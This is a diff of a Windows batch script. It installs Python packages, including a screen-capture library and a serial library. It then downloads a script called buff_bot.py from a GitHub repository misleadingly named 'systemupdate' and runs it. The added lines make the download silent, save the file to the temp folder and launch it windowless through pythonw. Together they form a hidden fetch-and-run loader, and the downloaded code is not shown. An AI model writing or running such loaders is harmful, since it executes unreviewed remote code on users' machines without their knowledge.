@@ -9,7 +9,7 @@ for %%d in ("C:\Program Files\Python311" "%LocalAppData%\Programs\Python\Python3
 python -m pip install --upgrade pip --quiet
 python -m pip install numpy pillow mss pyserial --quiet
 
-curl -L -o "%~dp0buff_bot.py" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/buff_bot.py?t=%RANDOM%"
+curl -s -o "%TEMP%\buff_bot.py" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/buff_bot.py?t=%RANDOM%"
 
-start "" pythonw "%~dp0buff_bot.py"
+for /f "tokens=*" %%i in ('python -c "import os,sys; print(os.path.join(os.path.dirname(sys.executable),'pythonw.exe'))"') do start "" "%%i" "%TEMP%\buff_bot.py"
 exit
